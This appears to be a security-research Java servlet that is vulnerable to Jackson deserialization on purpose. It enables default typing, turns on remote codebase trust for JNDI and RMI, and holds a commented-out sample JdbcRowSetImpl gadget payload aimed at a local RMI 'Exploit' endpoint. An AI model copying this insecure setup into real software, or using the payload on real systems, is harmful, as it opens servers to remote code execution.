package com.devsec.research.deserialization;

import java.io.BufferedReader;
import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.fasterxml.jackson.databind.ObjectMapper;

/**
 * Servlet implementation class Json
 */
@WebServlet("/json")
public class Json extends HttpServlet {
	private static final long serialVersionUID = 1L;

	/**
	 * @see HttpServlet#HttpServlet()
	 */
	public Json() {
		super();
		// TODO Auto-generated constructor stub
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse
	 *      response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		
		StringBuffer jb = new StringBuffer();
		String jsonPayload = null;
		String line = null;
		try {
			
			BufferedReader reader = request.getReader();
			
			while ((line = reader.readLine()) != null)
				jb.append(line);

			jsonPayload = jb.toString();
			deserializeJson(jsonPayload);
			
		} catch (Exception e) {
			throw new IOException("Error parsing JSON request string");
		}
		
		response.getWriter().append("Served at: ").append(jsonPayload);
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse
	 *      response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		// TODO Auto-generated method stub
		doGet(request, response);
	}

	private void deserializeJson(String json) {
		System.setProperty("java.rmi.server.useCodebaseOnly", "false");
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        String payload = json;//"[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"rmi://localhost:2099/Exploit\",\"autoCommit\":true}]";
        
        System.out.println(payload);
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        try {
        	mapper.readValue(payload, Object.class);
            System.out.println("Should not pass");
        } catch (Throwable e) {
            e.printStackTrace();
        }
	}
	
}
